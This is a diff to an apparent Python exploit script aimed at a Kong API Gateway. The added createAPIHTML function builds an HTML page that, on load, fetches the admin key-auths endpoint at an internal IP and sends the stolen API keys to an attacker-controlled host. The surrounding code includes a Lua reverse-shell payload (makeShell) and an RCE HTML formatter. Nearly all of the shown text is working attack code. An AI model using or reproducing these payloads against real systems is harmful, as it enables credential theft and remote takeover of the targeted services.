@@ -11,6 +11,37 @@ def log(message):
 
     pass
 
+def createAPIHTML(lhost):
+    """
+    Creates HTML for API key exfiltration, replacing the hardcoded IP with lhost.
+    
+    Args:
+        lhost (str): The host to send exfiltrated data to
+        
+    Returns:
+        str: Formatted HTML with the specified host
+    """
+    html_template = f'''<html>
+<head>
+<script>
+function exfiltrate() {{
+    fetch("http://172.16.16.2:8001/key-auths")
+    .then((response) => response.text())
+    .then((data) => {{
+        fetch("http://{lhost}/callback?" + encodeURIComponent(data));
+    }}).catch(err => {{
+        fetch("http://{lhost}/error?" + encodeURIComponent(err));
+    }}); 
+}}
+</script>
+</head>
+<body onload='exfiltrate()'>
+<div></div>
+</body>
+</html>'''
+    
+    return html_template
+
 def parseAPIKeyResponse(response):
     """
     Parses response from Kong API Gateway to get Admin Panel API key.
@@ -39,7 +70,7 @@ def makeShell(lhost, lport):
 
     return f"local s=require('socket');local t=assert(s.tcp());t:connect('{lhost}',{lport});while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"
 
-def formatHTML(lhost, lport):
+def formatRCEHTML(lhost, lport):
     """
     Formats HTML RCE code.
     """
